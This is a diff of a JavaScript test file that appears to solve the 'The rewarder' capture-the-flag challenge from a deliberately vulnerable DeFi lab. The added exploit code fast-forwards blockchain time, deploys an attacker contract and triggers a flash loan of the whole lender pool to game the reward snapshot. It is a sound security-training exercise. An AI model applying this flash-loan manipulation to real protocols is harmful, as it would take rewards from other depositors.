@@ -66,6 +66,18 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const fiveDays = 5 * 24 * 60 * 60;
+        await ethers.provider.send("evm_increaseTime", [fiveDays]);
+        const TheRewarderPoolAttackerFactory = await ethers.getContractFactory("TheRewarderPoolAttacker",attacker);
+        const attackerContract = await TheRewarderPoolAttackerFactory.deploy(
+            this.liquidityToken.address,
+            this.rewardToken.address,
+            this.flashLoanPool.address,
+            this.rewarderPool.address,
+        );
+
+        await attackerContract.flashLoan(TOKENS_IN_LENDER_POOL);
+
     });
 
     after(async function () {
@@ -92,6 +104,7 @@ describe('[Challenge] The rewarder', function () {
 
         // The amount of rewards earned should be really close to 100 tokens
         let delta = ethers.utils.parseEther('100').sub(rewards);
+
         expect(delta).to.be.lt(ethers.utils.parseUnits('1', 17));
 
         // Attacker finishes with zero DVT tokens in balance
